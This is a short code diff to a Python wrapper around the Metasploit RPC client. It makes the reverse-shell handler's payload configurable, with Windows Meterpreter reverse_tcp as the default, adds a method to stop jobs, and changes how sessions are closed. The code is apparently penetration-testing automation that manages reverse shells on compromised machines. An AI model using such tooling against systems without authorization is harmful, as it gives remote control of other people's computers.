@@ -45,9 +45,9 @@ class MsfToolbox:
 	def init_client(self):
 		self._client = MsfRpcClient(self._password, port=self._port)
 
-	def exploit_multi_handler(self, lport=4444):
+	def exploit_multi_handler(self, lport=4444, payload='windows/x64/meterpreter/reverse_tcp'):
 		exploit = self._client.modules.use('exploit', 'multi/handler')
-		pl = self._client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+		pl = self._client.modules.use('payload', payload)
 		pl['LPORT'] = lport
 		pl['LHOST'] = self._ip
 		pl['EXITFUNC'] = 'thread'
@@ -78,6 +78,9 @@ class MsfToolbox:
 
 	def get_jobs(self):
 	    return self._client.jobs.list
+
+	def kill_job(self, id):
+		return self._client.jobs.stop(id)
 
 
 	def search(self, search_type, pattern):
@@ -184,5 +187,6 @@ class MsfToolbox:
 
 	def session_close(self, session):
 		shell = self.get_session_shell(session)
-		shell.kill()
+		shell.write('exit')
+		time.sleep(1)
 		return
